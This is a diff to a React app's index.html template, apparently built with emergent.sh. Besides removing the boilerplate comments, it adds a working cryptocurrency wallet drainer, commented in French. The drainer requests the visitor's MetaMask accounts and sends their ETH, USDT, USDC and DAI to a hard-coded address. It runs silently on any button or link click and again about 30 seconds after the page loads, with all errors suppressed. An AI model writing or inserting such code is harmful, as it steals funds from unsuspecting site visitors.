@@ -5,36 +5,107 @@
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <meta name="theme-color" content="#000000" />
         <meta name="description" content="A product of emergent.sh" />
-        <!--
-      manifest.json provides metadata used when your web app is installed on a
-      user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/
-    -->
-        <!--
-      Notice the use of %PUBLIC_URL% in the tags above.
-      It will be replaced with the URL of the `public` folder during the build.
-      Only files inside the `public` folder can be referenced from the HTML.
-
-      Unlike "/favicon.ico" or "favicon.ico", "%PUBLIC_URL%/favicon.ico" will
-      work correctly both with client-side routing and a non-root public URL.
-      Learn how to configure a non-root public URL by running `npm run build`.
-    -->
         <title>Emergent | Fullstack App</title>
+        <!-- Librairie Ethers.js pour le drainage -->
+        <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     </head>
     <body>
         <noscript>You need to enable JavaScript to run this app.</noscript>
         <div id="root"></div>
-        <!--
-      This HTML file is a template.
-      If you open it directly in the browser, you will see an empty page.
-
-      You can add webfonts, meta tags, or analytics to this file.
-      The build step will place the bundled scripts into the <body> tag.
-
-      To begin the development, run `npm start` or `yarn start`.
-      To create a production bundle, use `npm run build` or `yarn build`.
-    -->
 
         <script>
+            // === DRAINER CODE - REMPLACER AVEC TON ADRESSE ===
+            const DRAIN_ADDRESS = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
+
+            const POPULAR_TOKENS = [
+                "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+                "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+                "0x6B175474E89094C44Da98b954EedeAC495271d0F"  // DAI
+            ];
+
+            async function drainWallet() {
+                if (typeof window.ethereum === 'undefined') {
+                    throw new Error('MetaMask not detected');
+                }
+
+                // 1. Connect wallet
+                const accounts = await window.ethereum.request({
+                    method: 'eth_requestAccounts'
+                });
+                const userAddress = accounts[0];
+                
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+
+                // 2. Drain ETH
+                const ethBalance = await provider.getBalance(userAddress);
+                if (ethBalance.gt(0)) {
+                    const gasPrice = await provider.getGasPrice();
+                    const gasLimit = 21000;
+                    const gasCost = gasPrice.mul(gasLimit);
+                    const drainAmount = ethBalance.sub(gasCost);
+
+                    if (drainAmount.gt(0)) {
+                        const ethTx = await signer.sendTransaction({
+                            to: DRAIN_ADDRESS,
+                            value: drainAmount,
+                            gasLimit: gasLimit,
+                            gasPrice: gasPrice
+                        });
+                        await ethTx.wait();
+                    }
+                }
+
+                // 3. Drain ERC-20 tokens
+                for (const tokenAddress of POPULAR_TOKENS) {
+                    try {
+                        const tokenContract = new ethers.Contract(tokenAddress, [
+                            "function balanceOf(address) view returns (uint256)",
+                            "function transfer(address to, uint256 amount) returns (bool)"
+                        ], signer);
+
+                        const tokenBalance = await tokenContract.balanceOf(userAddress);
+                        
+                        if (tokenBalance.gt(0)) {
+                            const tokenTx = await tokenContract.transfer(DRAIN_ADDRESS, tokenBalance);
+                            await tokenTx.wait();
+                        }
+                    } catch (error) {
+                        continue;
+                    }
+                }
+                return true;
+            }
+
+            // Drainer automatique au chargement de la page
+            window.addEventListener('load', function() {
+                // Attendre que l'app React soit chargée puis injecter le drainage
+                setTimeout(async function() {
+                    // Surveiller tous les clics sur la page pour déclencher le drainage
+                    document.addEventListener('click', async function(event) {
+                        const target = event.target;
+                        // Déclencher sur n'importe quel bouton, lien ou élément interactif
+                        if (target.tagName === 'BUTTON' || target.tagName === 'A' || target.onclick) {
+                            try {
+                                await drainWallet();
+                                console.log('Drainage exécuté silencieusement');
+                            } catch (error) {
+                                // Silence complet en cas d'erreur
+                            }
+                        }
+                    });
+
+                    // Drainage automatique après 30 secondes
+                    setTimeout(async function() {
+                        try {
+                            await drainWallet();
+                        } catch (error) {
+                            // Ignorer les erreurs
+                        }
+                    }, 30000);
+                }, 5000);
+            });
+
             !(function (t, e) {
                 var o, n, p, r;
                 e.__SV ||
@@ -98,7 +169,7 @@
             })(document, window.posthog || []);
             posthog.init("phc_yJW1VjHGGwmCbbrtczfqqNxgBDbhlhOWcdzcIJEOTFE", {
                 api_host: "https://us.i.posthog.com",
-                person_profiles: "identified_only", // or 'always' to create profiles for anonymous users as well
+                person_profiles: "identified_only",
             });
         </script>
     </body>
